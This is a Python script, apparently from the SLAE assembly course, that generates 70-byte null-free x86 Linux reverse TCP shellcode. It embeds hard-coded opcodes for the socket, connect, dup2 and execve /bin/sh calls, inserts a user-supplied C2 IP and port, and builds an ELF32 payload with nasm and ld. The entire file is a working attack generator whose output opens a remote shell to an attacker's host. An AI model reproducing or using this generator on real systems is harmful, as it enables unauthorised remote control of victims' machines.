# Filename: gen_reverse_tcp_shellcode.py
# Author: Upayan a.k.a. slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: This is a x86 Linux reverse TCP null-free shellcode generator written in 
# Python3. The C2 IP and the C2 Port is fed into the program and it spits out a 
# shellcode hex string and byte string and an ELF32 payload for Linux.
# Usage: python3 gen_reverse_tcp_shellcode.py
# Note: The connection attempt is not tuned so run the listener first. A
# 4 digit C2 port number is required. Also, you need NASM installed on the machine
# and install termcolor and pyfiglet python package for a cool look.
# Testing: ./shellcode_loader <paste generated shellcode here> OR ./reverse_tcp_payload
# Size of shellcode: 70 bytes


from termcolor import colored
import pyfiglet
import sys
import os


def main():
	ascii_banner = pyfiglet.figlet_format("ReverseTCP Shellcode Generator")
	print(colored(ascii_banner, 'blue'))
	print("\n")
	print(colored("Author: Upayan a.k.a slaeryan", "blue"))
	print("\n")
	print(colored("Purpose: This is a x86 Linux reverse TCP null-free shellcode generator written in Python3. The C2 IP and the C2 Port is fed into the   program and it spits out a x68 reverse TCP shellcode hex string and byte string and an ELF32 payload for Linux." , "blue"))
	print("\n")
	print(colored("Note: The connection attempt is not tuned so run the listener first. Also, a 4 digit C2 port number is required and the C2 IP address  cannot have zero octets.", "blue"))
	print("\n")
	print(colored("Testing: ./shellcode_loader <paste generated shellcode here> OR ./reverse_tcp_payload", "blue"))
	print("\n")
	shellcode = ''
	prependcode = "31c031db31c99966b86701b302b101cd8089c368"
	c2_ip_string = input(colored("Enter LHOST: ", "blue"))
	print("\n")
	c2_ip_hex = ''
	octetlist = c2_ip_string.split(".")
	for octet in octetlist:
		octet = int(octet)
		octet_hex = hex(octet).split('x')[-1]
		if len(octet_hex) != 2:
			octet_hex = "0" + octet_hex
		if octet_hex == "00":
			print(colored("[!] C2 IP cannot have zero octets in them ...", "blue"))
			print(colored("[!] Please try again ...", "blue"))
			print("\n")
			sys.exit(0)
		c2_ip_hex = c2_ip_hex + octet_hex
	#print(c2_ip_hex)
	middlecode = "6668"
	c2_port_string = input(colored("Enter LPORT: ", "blue"))
	print("\n")
	c2_port_hex = ''
	c2_port_int = int(c2_port_string)
	c2_port_hex = hex(c2_port_int).split('x')[-1]
	#print(c2_port_hex)
	appendcode = "666a0266b86a0189e1b210cd8031c9b103b03f49cd8075f99952682f2f7368682f62696e89e3b00bcd80"
	shellcode = prependcode + c2_ip_hex + middlecode + c2_port_hex + appendcode
	if (len(shellcode)/2) != 70:
		print("[!] Error generating shellcode ...")
	else:
		print(colored("[+] Size of shellcode: 70 bytes", "blue"))
		print("\n")
		print(colored("[+] Shellcode in hex string: " + shellcode, "blue"))
		print("\n")
		shellcode_byte_string = ''
		counter = 1
		byte = ''
		for i in shellcode:
			if (counter % 2 == 0):
				byte = "\\x" + byte + i
				shellcode_byte_string = shellcode_byte_string + byte
				byte = ''
			else:
				byte = byte + i
			counter += 1
		print(str(colored("[+] Shellcode in byte string: " + shellcode_byte_string, "blue")))
		print("\n")
		prepend_command = "nasm -f elf32 -o reverse_tcp_shellcode.o "
		c2_ip_hex_rev = ''
		c2_port_hex_rev = ''
		for octet in octetlist[::-1]:
			octet = int(octet)
			octet_hex = hex(octet).split('x')[-1]
			if len(octet_hex) != 2:
				octet_hex = "0" + octet_hex
			c2_ip_hex_rev = c2_ip_hex_rev + octet_hex
		c2_port_hex_rev = c2_port_hex[2] + c2_port_hex[3] + c2_port_hex[0] + c2_port_hex[1]
		middle_command1 = "-DC2_IP=0x" + c2_ip_hex_rev
		middle_command2 = " -DC2_PORT=0x" + c2_port_hex_rev
		append_command = " reverse_tcp_shellcode.nasm"
		command = prepend_command + middle_command1 + middle_command2 + append_command
		os.system(command)
		command = "ld -s -o reverse_tcp_payload reverse_tcp_shellcode.o"
		os.system(command)
		os.remove("reverse_tcp_shellcode.o")
		print(colored("[+] Reverse TCP payload generated", "blue"))
		print("\n")


main()